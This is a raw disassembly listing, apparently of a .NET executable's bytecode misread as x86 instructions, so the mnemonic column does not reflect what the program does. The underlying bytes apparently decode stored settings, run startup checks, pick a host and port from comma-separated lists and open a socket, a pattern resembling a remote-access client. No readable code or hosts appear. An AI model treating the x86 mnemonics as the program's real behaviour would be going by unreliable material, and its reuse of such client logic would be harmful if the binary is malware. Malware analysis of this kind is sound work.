  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	9d                   	popf
  4028e2:	01 00                	add    %eax,(%eax)
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	50                   	push   %eax
  4028ec:	02 00                	add    (%eax),%al
  4028ee:	70 80                	jo     0x402870
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	03 03                	add    (%ebx),%eax
  4028f7:	00 70 80             	add    %dh,-0x80(%eax)
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	17                   	pop    %ss
  402900:	03 00                	add    (%eax),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	2b 03                	sub    (%ebx),%eax
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	85 03                	test   %eax,(%ebx)
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	60                   	pusha
  40291e:	04 00                	add    $0x0,%al
  402920:	70 80                	jo     0x4028a2
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	bb 16 00 70 80       	mov    $0x80700016,%ebx
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	6e                   	outsb  %ds:(%esi),(%dx)
  402932:	1e                   	push   %ds
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	21 1f                	and    %ebx,(%edi)
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	d4 1f                	aam    $0x1f
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	87 20                	xchg   %esp,(%eax)
  402957:	00 70 80             	add    %dh,-0x80(%eax)
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	8b 20                	mov    (%eax),%esp
  402961:	00 70 80             	add    %dh,-0x80(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	3e 21 00             	and    %eax,%ds:(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 48 21 00       	add    $0x214872,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	48                   	dec    %eax
  402aa0:	21 00                	and    %eax,(%eax)
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 4a 21    	add    %esp,0x214a7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
